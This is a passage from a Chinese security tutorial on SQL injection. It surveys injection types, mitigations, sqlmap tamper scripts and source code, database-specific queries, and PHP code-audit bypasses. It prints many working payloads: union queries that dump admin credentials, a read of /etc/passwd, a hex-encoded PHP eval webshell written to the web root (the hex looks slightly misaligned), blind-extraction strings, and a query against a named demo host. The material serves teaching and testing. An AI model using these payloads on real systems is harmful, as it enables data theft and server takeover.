@@ -1,0 +1,1234 @@
+
+
+  
+
+  
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">SQL注入关联分析</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" class="author name ng-binding">
+          sm0nk</a>
+        <span class="bull">·</span>
+        <time title="2016/06/24 10:48" ui-time="" datetime="2016/06/24 10:48" class="published ng-binding ng-isolate-scope">2016/06/24 10:48</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        </p><p><strong>Author：<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9ae9f7aaf4f1da7d16147c122d7f34047330167f343e">[email&#160;protected]</a></strong></p>
+
+<h1>0x00 序</h1>
+
+<hr>
+
+<p>打开亚马逊，当挑选一本《Android4高级编程》时，它会不失时机的列出你可能还会感兴趣的书籍，比如Android游戏开发、Cocos2d-x引擎等，让你的购物车又丰富了些，而钱包又空了些。关联分析，即从一个数据集中发现项之间的隐藏关系。</p>
+
+<p>在Web攻防中，SQL注入绝对是一个技能的频繁项，为了技术的成熟化、自动化、智能化，我们有必要建立SQL注入与之相关典型技术之间的关联规则。在分析过程中，整个规则均围绕核心词进行直线展开，我们简单称之为“线性”关联。以知识点的复杂性我们虽然称不上为神经网络，但它依然像滚雪球般对知识架构进行完善升级，所以也可称之为雪球技术。</p>
+
+<!--more-->
+
+<p>本文以SQL注入为核心，进行的资料信息整合性解读，主要目的有：</p>
+
+<ol>
+<li>为关联分析这门科学提供简单认知</li>
+<li>为初级安全爱好学习者提供参考，大牛绕过</li>
+<li>分析各关键点的区别与联系</li>
+<li>安全扫盲</li>
+</ol>
+
+<p>本文结构如下：</p>
+
+<p><img alt="p1" img-src="3a6fbdee210f82becb763b7b8c8b622a348222fb.jpg"></p>
+
+<p><em>PS：文章中使用了N多表格形式，主要是为了更好的区别与联系，便于关联分析及对比。</em></p>
+
+<h1>0x01 基本科普</h1>
+
+<hr>
+
+<h3>1.1 概念说明</h3>
+
+<p>说明：通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。<a href="http://wiki.wooyun.org/web:sql">http://wiki.wooyun.org/web:sql</a></p>
+
+<p>影响：数据库增删改查、后台登录、getshell</p>
+
+<p>修复：</p>
+
+<ol>
+<li>使用参数检查的方式，拦截带有SQL语法的参数传入应用程序</li>
+<li>使用预编译的处理方式处理拼接了用户参数的SQL语句</li>
+<li>在参数即将进入数据库执行之前，对SQL语句的语义进行完整性检查，确认语义没有发生变化</li>
+<li>在出现SQL注入漏洞时，要在出现问题的参数拼接进SQL语句前进行过滤或者校验，不要依赖程序最开始处防护代码</li>
+<li>定期审计数据库执行日志，查看是否存在应用程序正常逻辑之外的SQL语句执行</li>
+</ol>
+
+<h3>1.2 注入分类</h3>
+
+<ol>
+<li>按照数据包方式分类 
+
+<ol>
+<li>Get post cookie auth</li>
+</ol></li>
+<li>按照呈现形式 
+
+<ol>
+<li>回显型注入 
+
+<ol>
+<li>Int string search</li>
+</ol></li>
+<li>盲注 
+
+<ol>
+<li>Error bool time</li>
+</ol></li>
+<li>另类注入 
+
+<ol>
+<li>宽字节注入</li>
+<li>http header 注入</li>
+<li>伪静态</li>
+<li>Base64变形</li>
+</ol></li>
+</ol></li>
+</ol>
+
+<h1>0x02 神器解读</h1>
+
+<hr>
+
+<h3>2.1 何为神器</h3>
+
+<ul>
+<li><a href="http://sqlmap.org/">SQLMAP</a></li>
+</ul>
+
+<p>使用方法，参见乌云知识库。</p>
+
+<ol>
+<li><a href="http://drops.wooyun.org/tips/143">sqlmap用户手册</a></li>
+<li><a href="http://drops.wooyun.org/tips/401">sqlmap用户手册[续]</a></li>
+<li><a href="http://drops.wooyun.org/tips/5254">sqlmap进阶使用</a></li>
+</ol>
+
+<p><strong>Tamper 概览</strong></p>
+
+<table>
+<thead>
+<tr>
+  <th>脚本名称</th>
+  <th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>apostrophemask.py</td>
+  <td>用utf8代替引号</td>
+</tr>
+<tr>
+  <td>equaltolike.py</td>
+  <td>like 代替等号</td>
+</tr>
+<tr>
+  <td>space2dash.py</td>
+  <td>绕过过滤‘=’ 替换空格字符（”），（'' – '）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td>
+</tr>
+<tr>
+  <td>greatest.py</td>
+  <td>绕过过滤’>’ ,用GREATEST替换大于号。</td>
+</tr>
+<tr>
+  <td>space2hash.py</td>
+  <td>空格替换为#号 随机字符串 以及换行符</td>
+</tr>
+<tr>
+  <td>apostrophenullencode.py</td>
+  <td>绕过过滤双引号，替换字符和双引号。</td>
+</tr>
+<tr>
+  <td>halfversionedmorekeywords.py</td>
+  <td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td>
+</tr>
+<tr>
+  <td>space2morehash.py</td>
+  <td>空格替换为 #号 以及更多随机字符串 换行符</td>
+</tr>
+<tr>
+  <td>appendnullbyte.py</td>
+  <td>在有效负荷结束位置加载零字节字符编码</td>
+</tr>
+<tr>
+  <td>ifnull2ifisnull.py</td>
+  <td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td>
+</tr>
+<tr>
+  <td>space2mssqlblank.py</td>
+  <td>空格替换为其它空符号</td>
+</tr>
+<tr>
+  <td>base64encode.py</td>
+  <td>用base64编码替换</td>
+</tr>
+<tr>
+  <td>space2mssqlhash.py</td>
+  <td>替换空格</td>
+</tr>
+<tr>
+  <td>modsecurityversioned.py</td>
+  <td>过滤空格，包含完整的查询版本注释</td>
+</tr>
+<tr>
+  <td>space2mysqlblank.py</td>
+  <td>空格替换其它空白符号(mysql)</td>
+</tr>
+<tr>
+  <td>between.py</td>
+  <td>用between替换大于号（>）</td>
+</tr>
+<tr>
+  <td>space2mysqldash.py</td>
+  <td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td>
+</tr>
+<tr>
+  <td>multiplespaces.py</td>
+  <td>围绕SQL关键字添加多个空格</td>
+</tr>
+<tr>
+  <td>space2plus.py</td>
+  <td>用+替换空格</td>
+</tr>
+<tr>
+  <td>bluecoat.py</td>
+  <td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</td>
+</tr>
+<tr>
+  <td>nonrecursivereplacement.py</td>
+  <td>取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</td>
+</tr>
+<tr>
+  <td>space2randomblank.py</td>
+  <td>代替空格字符（“”）从一个随机的空白字符可选字符的有效集</td>
+</tr>
+<tr>
+  <td>sp_password.py</td>
+  <td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
+</tr>
+<tr>
+  <td>chardoubleencode.py</td>
+  <td>双url编码(不处理以编码的)</td>
+</tr>
+<tr>
+  <td>unionalltounion.py</td>
+  <td>替换UNION ALL SELECT UNION SELECT</td>
+</tr>
+<tr>
+  <td>charencode.py</td>
+  <td>url编码</td>
+</tr>
+<tr>
+  <td>randomcase.py</td>
+  <td>随机大小写</td>
+</tr>
+<tr>
+  <td>unmagicquotes.py</td>
+  <td>宽字符绕过 GPC addslashes</td>
+</tr>
+<tr>
+  <td>randomcomments.py</td>
+  <td>用/**/分割sql关键字</td>
+</tr>
+<tr>
+  <td>charunicodeencode.py</td>
+  <td>字符串 unicode 编码</td>
+</tr>
+<tr>
+  <td>securesphere.py</td>
+  <td>追加特制的字符串</td>
+</tr>
+<tr>
+  <td>versionedmorekeywords.py</td>
+  <td>注释绕过</td>
+</tr>
+<tr>
+  <td>space2comment.py</td>
+  <td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
+</tr>
+</tbody>
+</table>
+
+<p>一些妙用:</p>
+
+<ol>
+<li>避免过多的错误请求被屏蔽 参数：--safe-url,--safe-freq</li>
+<li>二阶SQL注入 参数：--second-order</li>
+<li>从数据库服务器中读取文件 参数：--file-read</li>
+<li>把文件上传到数据库服务器中 参数：--file-write,--file-dest</li>
+<li>爬行网站URL 参数：--crawl</li>
+<li>非交互模式 参数：--batch</li>
+<li>测试WAF/IPS/IDS保护 参数：--identify-waf</li>
+<li>启发式判断注入 参数：--smart（有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。）</li>
+<li>-technique 
+
+<ul>
+<li>B：基于Boolean的盲注(Boolean based blind)</li>
+<li>Q：内联查询(Inline queries)</li>
+<li>T：基于时间的盲注(time based blind)</li>
+<li>U：基于联合查询(Union query based)</li>
+<li>E：基于错误(error based)</li>
+<li>S：栈查询(stack queries)</li>
+</ul></li>
+</ol>
+
+<h3>2.2 源码精读</h3>
+
+<p>流程图</p>
+
+<p><img alt="p2" img-src="88d179b797459fca727e0565c40f42dda53b5644.jpg"></p>
+
+<p>目前还未看完，先摘抄一部分（基于时间的盲注）讲解：</p>
+
+<p>测试应用是否存在SQL注入漏洞时，经常发现某一潜在的漏洞难以确认。这可能源于多种原因，但主要是因为Web应用未显示任何错误，因而无法检索任何数据。</p>
+
+<p>对于这种情况，要想识别漏洞，向数据库注入时间延迟并检查服务器响应是否也已经延迟会很有帮助。时间延迟是一种很强大的技术，Web服务器虽然可以隐藏错误或数据，但必须等待数据库返回结果，因此可用它来确认是否存在SQL注入。该技术尤其适合盲注。</p>
+
+<p>使用了基于时间的盲注来对目标网址进行盲注测试，代码如下：</p>
+
+<pre><code>#!python
+# In case of time-based blind or stacked queries
+# SQL injections
+elif method == PAYLOAD.METHOD.TIME:
+    # Perform the test's request
+    trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)
+    if trueResult:
+        # Confirm test's results
+        trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)
+        if trueResult:
+            infoMsg = "%s parameter '%s' is '%s' injectable " % (place, parameter, title)
+            logger.info(infoMsg)
+            injectable = True
+</code></pre>
+
+<p>重点注意Request.queryPage函数，将参数timeBasedCompare设置为True，所以在Request.queryPage函数内部,有这么一段代码：</p>
+
+<pre><code>#!python
+if timeBasedCompare:
+    return wasLastRequestDelayed()
+</code></pre>
+
+<p>而函数wasLastRequestDelayed()的功能主要是判断最后一次的请求是否有明显的延时，方法就是将最后一次请求的响应时间与之前所有请求的响应时间的平均值进行比较，如果最后一次请求的响应时间明显大于之前几次请求的响应时间的平均值，就说明有延迟。</p>
+
+<p>wasLastRequestDelayed函数的代码如下：</p>
+
+<pre><code>#!python
+def wasLastRequestDelayed():
+    """
+    Returns True if the last web request resulted in a time-delay
+    """
+    deviation = stdev(kb.responseTimes)
+    threadData = getCurrentThreadData()
+    if deviation:
+        if len(kb.responseTimes) &lt; MIN_TIME_RESPONSES:
+            warnMsg = "time-based standard deviation method used on a model "
+            warnMsg += "with less than %d response times" % MIN_TIME_RESPONSES
+            logger.warn(warnMsg)
+        lowerStdLimit = average(kb.responseTimes) + TIME_STDEV_COEFF * deviation
+        retVal = (threadData.lastQueryDuration &gt;= lowerStdLimit)
+        if not kb.testMode and retVal and conf.timeSec == TIME_DEFAULT_DELAY:
+            adjustTimeDelay(threadData.lastQueryDuration, lowerStdLimit)
+        return retVal
+    else:
+        return (threadData.lastQueryDuration - conf.timeSec) &gt;= 0
+</code></pre>
+
+<p>每次执行http请求的时候，会将执行所响应的时间append到kb.responseTimes列表中，但不包括time-based blind所发起的请求。</p>
+
+<p>从以下代码就可以知道了，当timeBasedCompare为True（即进行time-based blind注入检测）时，直接返回执行结果，如果是其他类型的请求，就保存响应时间。</p>
+
+<pre><code>#!python
+if timeBasedCompare:
+    return wasLastRequestDelayed()
+elif noteResponseTime:
+    kb.responseTimes.append(threadData.lastQueryDuration)
+</code></pre>
+
+<p>另外，为了确保基于时间的盲注的准确性，sqlmap执行了两次queryPage。</p>
+
+<p>如果2次的结果都为True，那么就说明目标网址可注入，所以将injectable 设置为True。</p>
+
+<h1>0x03 数据库特性</h1>
+
+<hr>
+
+<h3>3.1 Web报错关键字</h3>
+
+<ul>
+<li>Microsoft OLE DB Provider</li>
+<li>ORA-</li>
+<li>PLS-</li>
+<li>Error in your SQL Syntax</li>
+<li>SQL Error</li>
+<li>Incorrect Syntax near</li>
+<li>Failed Mysql</li>
+<li>Unclosed Quotation Mark</li>
+<li>JDBC/ODBC Driver</li>
+</ul>
+
+<h3>3.2 版本查询</h3>
+
+<ul>
+<li>Mysql: <code>/?param=1 select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</code></li>
+<li>MSSQL: <code>/?param=1 and(1)=convert(int,@@version)--</code></li>
+<li>Sybase: <code>/?param=1 and(1)=convert(int,@@version)--</code></li>
+<li>Oracle >=9.0: <code>/?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v\_$version where rownum=1)||chr(62))) from dual)—</code></li>
+<li>PostgreSQL: <code>/?param=1 and(1)=cast(version() as numeric)--</code></li>
+</ul>
+
+<h3>3.3 SQL方言差异</h3>
+
+<table>
+<thead>
+<tr>
+  <th>DB</th>
+  <th>连接符</th>
+  <th>行注释</th>
+  <th>唯一的默认表变量和函数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>MSSQL</td>
+  <td>%2B（URL+号编码）(e.g. ?category=sho’%2b’es)</td>
+  <td>--</td>
+  <td>@@PACK_RECEIVED</td>
+</tr>
+<tr>
+  <td>MYSQL</td>
+  <td>%20 （URL空格编码）</td>
+  <td>#</td>
+  <td>CONNECTION_ID()</td>
+</tr>
+<tr>
+  <td>Oracle</td>
+  <td><code>||</code></td>
+  <td>--</td>
+  <td>BITAND(1,1)</td>
+</tr>
+<tr>
+  <td>PGsql</td>
+  <td><code>||</code></td>
+  <td>--</td>
+  <td>getpgusername()</td>
+</tr>
+<tr>
+  <td>Access</td>
+  <td>“a” &amp; “b”</td>
+  <td>N/A</td>
+  <td>msysobjects</td>
+</tr>
+</tbody>
+</table>
+
+<h3>3.4 SQL常用语句</h3>
+
+<p><strong>SQL常用语句</strong></p>
+
+<table>
+<thead>
+<tr>
+  <th>内容</th>
+  <th>MSSQL</th>
+  <th>MYSQL</th>
+  <th>ORACLE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>查看版本</td>
+  <td>select @@version</td>
+  <td>select @@version select version()</td>
+  <td>Select banner from v$version;</td>
+</tr>
+<tr>
+  <td>当前用户</td>
+  <td>select system&#95;users; select suer&#95;sname(); select user; select loginname from master..sysprocesses WHERE spid =@@SPID;</td>
+  <td>select user(); select system_user();</td>
+  <td>Select user from dual</td>
+</tr>
+<tr>
+  <td>列出用户</td>
+  <td>select name from master..syslogins;</td>
+  <td>select user from mysql.user;</td>
+  <td>Select username from all&#95;users ORDER BY username; Select username from all&#95;users;</td>
+</tr>
+<tr>
+  <td>当前库</td>
+  <td>select DB_NAME();</td>
+  <td>select database();</td>
+  <td>Select global&#95;name from global&#95;name;</td>
+</tr>
+<tr>
+  <td>列出数据库</td>
+  <td>select name from master..sysdatabases;</td>
+  <td>select schema&#95;name from information&#95;schema.schemata;</td>
+  <td>Select ower,table&#95;name from all&#95;users; #列出表明</td>
+</tr>
+<tr>
+  <td>当前用户权限</td>
+  <td>select is_srvolemenber(‘sysadmin’);</td>
+  <td>select grantee, privilege&#95;type,is&#95;grantable from information schema.user privileges;</td>
+  <td>Select * from user role&#95;privs; Select * from user&#95;sys_privs;</td>
+</tr>
+<tr>
+  <td>服务器主机名</td>
+  <td>select @@servername;</td>
+  <td>/</td>
+  <td>Select sys_context(‘USERENV’,’HOST’) from dual;</td>
+</tr>
+</tbody>
+</table>
+
+<p><img alt="p3" img-src="89ee294ed22d03ee2a96a3526fb72ecb83b52e5d.jpg"></p>
+
+<h3>3.5 盲注函数</h3>
+
+<table>
+<thead>
+<tr>
+  <th>数据</th>
+  <th>MSSQL</th>
+  <th>Mysql</th>
+  <th>oracle</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>字符串长度</td>
+  <td>LEN()</td>
+  <td>LENGTH()</td>
+  <td>LENGTH()</td>
+</tr>
+<tr>
+  <td>从给定字符串中提取子串</td>
+  <td>SUBSTRING(string,offset,length)</td>
+  <td>SELECT SUBSTR(string,offset,length)</td>
+  <td>SELECT SUBSTR(string,offset,length) From dual</td>
+</tr>
+<tr>
+  <td>字符串(‘ABC’)不带单引号的表示方式</td>
+  <td>SELECT CHAR(0X41)+CHAR(0X42)+ CHAR(0X43)</td>
+  <td>Select char(65,66,67)</td>
+  <td>Select chr(65)||chr(66)+chr(67) from dual</td>
+</tr>
+<tr>
+  <td>触发延时</td>
+  <td>WAITFOR DELAY ‘0:0:9’</td>
+  <td>BENCHMARK(1000000,MD5(“HACK”)) Sleep(10)</td>
+  <td>BEGIN DBMS&#95;LOCK.SLEEP(5);END; --(仅PL/SQL注入) UTL&#95;INADDR.get&#95;host&#95;name() UTL&#95;INADDR.get&#95;host&#95;address() UTL&#95;HTTP.REQUEST()</td>
+</tr>
+<tr>
+  <td>IF语句</td>
+  <td>If (1=1) select ‘A’ else select ‘B’</td>
+  <td>SELECT if(1=1,’A’,’B’)</td>
+  <td>/</td>
+</tr>
+</tbody>
+</table>
+
+<p><em>PS：SQLMAP 针对Oracle注入时，使用了比较费解的SUBSTRC,好多时候得中转更改为SUBSTR.</em></p>
+
+<h1>0x04 手工注入</h1>
+
+<hr>
+
+<h3>4.1 应用场景</h3>
+
+<ol>
+<li>快速验证（概念性证明）</li>
+<li>工具跑不出来了 
+
+<ol>
+<li>的确是注入，但不出数据</li>
+<li>特征不规律，挖掘规律，定制脚本</li>
+</ol></li>
+<li>绕过过滤 
+
+<ol>
+<li>有WAF，手工注入</li>
+<li>有过滤，搞绕过</li>
+</ol></li>
+<li>盲注类</li>
+</ol>
+
+<h3>4.2 常用语句</h3>
+
+<p><img alt="p4" img-src="93c9f47f0490d94342f33866def9f523d419e441.jpg"></p>
+
+<table>
+  <tr>
+    <th>
+      数据库
+    </th>
+    
+    <th>
+      语句(大多需要配合编码)
+    </th>
+  </tr>
+  
+  <tr>
+    <td>
+      Oracle
+    </td>
+    
+    <td>
+      oder by N <br># 爆出第一个数据库名 <br>and 1=2 union select 1,2,(select banner from sys.v_ where rownum=1),4,5,6 from dual <br># 依次爆出所有数据库名,假设第一个库名为first_dbname <br>and 1=2 union select 1,2,(select owner from all_tables where rownum=1 and owner<>'first_dbname'),4,5,6 from dual <br>爆出表名 <br>and 1=2 union select 1,2,(select table_name from user_tables where rownum=1),4,5,6 from dual <br>同理,同爆出下一个数据库类似爆出下一个表名就不说了,但是必须注意表名用大写或者表名大写的十六进制代码。 <br>有时候我们只想要某个数据库中含密码字段的表名,采用模糊查询语句，如下： <br>and (select column_name from user_tab_columns where column_name like '%25pass%25')<0 <br="">爆出表tablename中的第一个字段名 <br>and 1=2 union select 1,2,(select column_name from user_tab_columns where table_name='tablename' and rownum=1),4,5,6 from dual <br>依次下一个字段名 <br>and 1=2 union select 1,2,(select column_name from user_tab_columns where table_name='tablename' and column_name<>'first_col_name' and rownum=1),4,5,6 from dual <br> <br>若为基于时间或者基于bool类型盲注，可结合substr 、ASCII进行赋值盲测。 <br>若屏蔽关键函数，可尝试SYS_CONTEXT('USERENV','CURRENT_USER')类用法。
+    </0></td>
+  </tr>
+  
+  <tr>
+    <td>
+      Mysql
+    </td>
+    
+    <td>
+      #正常语句 <br>192.168.192.128/sqltest/news.php?id=1 <br>#判断存在注入否 <br>192.168.192.128/sqltest/news.php?id=1 and 1=2 <br>#确定字段数 order by <br>192.168.192.128/sqltest/news.php?id=-1 order by 3 <br>#测试回显字段 <br>192.168.192.128/sqltest/news.php?id=-1 union select 1,2,3 <br>#测试字段内容 <br>192.168.192.128/sqltest/news.php?id=-1 union select 1,user(),3 <br>192.168.192.128/sqltest/news.php?id=-1 union select 1,group_concat(user(),0x5e5e,version(),0x5e5e,database(),0x5e5e,@@basedir),3 <br>#查询当前库下所有表 <br>192.168.192.128/sqltest/news.php?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() <br>#查询admin表下的字段名（16进制） <br>192.168.192.128/sqltest/news.php?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x61646d696e <br>#查询admin表下的用户名密码 <br>192.168.192.128/sqltest/news.php?id=-1 union select 1,2,group_concat(name,0x5e,pass) from admin <br>#读取系统文件（/etc/passwd，需转换为16进制） <br>192.168.192.128/sqltest/news.php?id=-1 union select 1,2,load_file(0x2f6574632f706173737764) <br>#文件写入 <br>192.168.192.128/sqltest/news.php?id=-1 union select 1,2,0x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e into outfile '/var/www/html/1.php'-- <br><em>PS：若权限不足，换个目录</em>
+    </td>
+  </tr>
+  
+  <tr>
+    <td>
+      MSSQL
+    </td>
+    
+    <td>
+      <em>PS：回显型请查阅参考资料的链接，这里主要盲注的语法。</em> <br> #爆数据库版本（可先测长度） <br> aspx?c=c1'/**/and/**/ascii(substring(@@version,1,1))=67/**/--&t=0 <br> ps:在范围界定时，可利用二分查找结合大于小于来利用；亦可直接赋值脚本爆破，依次类推直至最后一字母。 <br> #爆当前数据库名字 <br> aspx?c=c1'/**/and/**/ascii(substring(db_name(),1,1))>200/**/--&t=0 <br> #爆表 <br> aspx?c=c1'/**/and/**/ascii(substring((select/**/top/**/1 name/**/from/**/dbname.sys.all_objects where type='U'/**/AND/**/is_ms_shipped=0),1,1))>0/**/--&t=0 <br> #爆user表内字段 <br> aspx?c=c1'/**/and/**/ascii(substring((select/**/top/**/ 1/**/COLUMN_NAME from/**/dbname.information_schema.columns/**/where/** /TABLE_NAME='user'),1,1))>0/**/--&t=0 <br> #爆数据 <br> aspx?c=c1'/**/and/**/ascii(substring((select/**/top/**/1/**/fPwd/**/from/**/User),1,1))>0/**/--&t=0
+    </td>
+  </tr>
+</table>
+
+<p><em>PS:关于注入绕过（bypass），内容偏多、过细，本次暂不归纳。单独一篇</em></p>
+
+<h1>0x05 漏洞挖掘</h1>
+
+<hr>
+
+<h3>5.1 黑盒测试</h3>
+
+<p>套装组合</p>
+
+<ol>
+<li>AWVS类 + sqlmap （手工）</li>
+<li>Burp + sqlmapAPI（手工）</li>
+</ol>
+
+<p><img alt="p5" img-src="458fa738d88158d8c8f22eba6ebfcf10a59950fc.jpg"></p>
+
+<p>减少体力活的工程化</p>
+
+<ul>
+<li><a href="http://zone.wooyun.org/content/21289">Sqli-hunter</a></li>
+<li><a href="http://zone.wooyun.org/content/24172">GourdScan</a></li>
+</ul>
+
+<h3>5.2 代码审计</h3>
+
+<p>白盒的方式有两种流，一种是检查所有输入，另一种是根据危险函数反向</p>
+
+<p><a href="https://www.91ri.org/15074.html">注入引发的特征点及敏感函数</a></p>
+
+<table>
+<thead>
+<tr>
+  <th>NO.</th>
+  <th>概要</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>1</td>
+  <td>$_SERVER未转义</td>
+</tr>
+<tr>
+  <td>2</td>
+  <td>更新时未重构更新序列</td>
+</tr>
+<tr>
+  <td>3</td>
+  <td>使用了一个未定义的常量</td>
+</tr>
+<tr>
+  <td>4</td>
+  <td>PHP自编标签与strip_tags顺序逻辑绕过</td>
+</tr>
+<tr>
+  <td>5</td>
+  <td>可控变量进入双引号</td>
+</tr>
+<tr>
+  <td>6</td>
+  <td>宽字节转编码过程</td>
+</tr>
+<tr>
+  <td>7</td>
+  <td>mysql多表查询绕过</td>
+</tr>
+<tr>
+  <td>8</td>
+  <td>别名as+反引号可闭合其后语句</td>
+</tr>
+<tr>
+  <td>9</td>
+  <td>mysql的类型强制转换</td>
+</tr>
+<tr>
+  <td>10</td>
+  <td>过滤条件是否有if判断进入</td>
+</tr>
+<tr>
+  <td>11</td>
+  <td>全局过滤存在白名单</td>
+</tr>
+<tr>
+  <td>12</td>
+  <td>字符串截断函数获取定长数据</td>
+</tr>
+<tr>
+  <td>13</td>
+  <td>括号包裹绕过</td>
+</tr>
+<tr>
+  <td>14</td>
+  <td>弱类型验证机制</td>
+</tr>
+<tr>
+  <td>15</td>
+  <td>WAF或者过滤了and|or的情况可以使用&amp;&amp;与||进行盲注。</td>
+</tr>
+<tr>
+  <td>16</td>
+  <td>windows下php中访问文件名使用”&lt;” “>”将会被替换成”*” “?”</td>
+</tr>
+<tr>
+  <td>17</td>
+  <td>二次urldecode注入</td>
+</tr>
+<tr>
+  <td>18</td>
+  <td>逻辑引用二次注入</td>
+</tr>
+</tbody>
+</table>
+
+<p><strong>1.</strong>$&#95;SERVER[‘PHP&#95;SELF’]和$&#95;SERVER[‘QUERY&#95;STRING’]，而$_SERVER并没有转义，造成了注入。</p>
+
+<p><strong>2.</strong>update更新时没有重构更新序列，导致更新其他关键字段（金钱、权限）</p>
+
+<p><img alt="p6" img-src="d2fe79e79b43afeb1cd8fd83b049a1342c6dacfc.jpg"></p>
+
+<p><img alt="p7" img-src="da8da4bc5b684aa47536ddf95d11eecc1d9cd245.jpg"></p>
+
+<p><img alt="p8" img-src="13442c651511aca59f100a27b1b884acbeaaab99.jpg"></p>
+
+<p><strong>3.</strong>在 php中 如果使用了一个未定义的常量，PHP 假定想要的是该常量本身的名字，如同用字符串调用它一样（CONSTANT 对应 “CONSTANT”）。此时将发出一个 E_NOTICE 级的错误（参考<a href="http://php.net/manual/zh/language.constants.syntax.php">http://php.net/manual/zh/language.constants.syntax.php</a>）</p>
+
+<p><strong>4.</strong>PHP中自编写对标签的过滤或关键字过滤，应放在strip_tags等去除函数之后，否则引起过滤绕过。</p>
+
+<pre><code>#!php
+&lt;?php 
+function mystrip_tags($string)
+{
+    $string = remove_xss($string);
+    $string = new_html_special_chars($string);
+    $string = strip_tags($string);//remove_xss在strip_tags之前调用，所以很明显可以利用strip_tags函数绕过,在关键字中插入html标记.
+    return $string;
+}
+?&gt;
+</code></pre>
+
+<p><img alt="p9" img-src="d4b5915823b76ac2e2354ccf901a46fd7f63003d.jpg"></p>
+
+<p><strong>5.</strong>当可控变量进入双引号中时可形成webshell因此代码执行使用，${file&#95;put&#95;contents($&#95;GET[f],$&#95;GET[p])}可以生成webshell。</p>
+
+<p><img alt="p10" img-src="6d8d1b892807f8f7caee307839412d2759d8aa2d.jpg"></p>
+
+<p><strong>6.</strong>宽字节转编码过程中出现宽字节注入</p>
+
+<p>PHP连接MySQL时设置<code>set character_set_client=gbk</code> ,MySQL服务器对查询语句进行GBK转码导致反斜杠<code>\</code>被<code>%df</code>吃掉。</p>
+
+<p><strong>7.</strong>构造查询语句时无法删除目标表中不存在字段时可使用mysql多表查询绕过</p>
+
+<pre><code>#!sql
+select uid,password from users,admins；
+(uid存在于users、password存在于admins）
+</code></pre>
+
+<p><img alt="p11" img-src="3c93c2b1313f2cf03fc284511f22efd08f95e735.jpg"></p>
+
+<p><strong>8.</strong>mysql中（反引号）能作为注释符，且会自动闭合末尾没有闭合的反引号。无法使用注释符的情况下使用别名as+反引号可闭合其后语句。</p>
+
+<p><strong>9.</strong>mysql的类型强制转换可绕过PHP中empty()函数对0的false返回</p>
+
+<pre><code>提交/?test=0axxx  -&gt;  empty($_GET['test'])  =&gt;  返回真
+</code></pre>
+
+<p>但是mysql中提交其0axxx到数字型时强制转换成数字0</p>
+
+<p><img alt="p12" img-src="60aae2319d2a089f7ee2c860a66e9ca6289b4a65.jpg"></p>
+
+<p><strong>10.</strong>存在全局过滤时观察过滤条件是否有if判断进入，cms可能存在自定义safekey不启用全局过滤。通过程序遗留或者原有界面输出safekey导致绕过。</p>
+
+<pre><code>#!php
+if($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey'])
+{
+foreach($_POST as $id=&gt;$v){
+safesql($id,$v,"POST",$config);
+$id = sfkeyword($id,$config);
+$v = sfkeyword($v,$config);
+$_POST[$id]=common_htmlspecialchars($v);
+}
+}
+</code></pre>
+
+<p><strong>11.</strong>由于全局过滤存在白名单限定功能，可使用无用参数带入绕过。</p>
+
+<pre><code>$webscan_white_directory='admin|\/dede\/|\/install\/';
+</code></pre>
+
+<p>请求中包含了白名单参数所以放行。</p>
+
+<pre><code>http://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=1' and 1=2 union select xxx
+</code></pre>
+
+<p><strong>12.</strong>字符串截断函数获取定长数据，截取<code>\\</code>或<code>\’</code>前一位，闭合语句。</p>
+
+<p>利用条件必须是存在两个可控参数，前闭合，后注入。</p>
+
+<p><strong>13.</strong>过滤了空格，逗号的注入，可使用括号包裹绕过。具体如遇到select from（关键字空格判断的正则，且剔除/**/等）可使用括号包裹查询字段绕过。</p>
+
+<p><strong>14.</strong>由于PHP弱类型验证机制，导致<code>==</code>、<code>in_array()</code>等可通过强制转换绕过验证。</p>
+
+<p><img alt="p13" img-src="4d1d8fdf0122df817bd7dc5d0eebdf205dfb5dd2.jpg"></p>
+
+<p><strong>15.</strong>WAF或者过滤了and|or的情况可以使用&amp;&amp;与||进行盲注。</p>
+
+<pre><code>#!sql
+http://demo.74cms.com/user/user_invited.php?id=1%20||%20strcmp(substr(user(),1,13),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&amp;act=invited
+</code></pre>
+
+<p><strong>16.</strong>windows下php中访问文件名使用”&lt;” “>”将会被替换成”*” “?”，分别代表N个任意字符与1个任意字符。</p>
+
+<pre><code>file_get_contents("/images/".$_GET['a'].".jpg");
+</code></pre>
+
+<p>可使用<code>test.php?a=../a&lt;%00</code>访问对应php文件。</p>
+
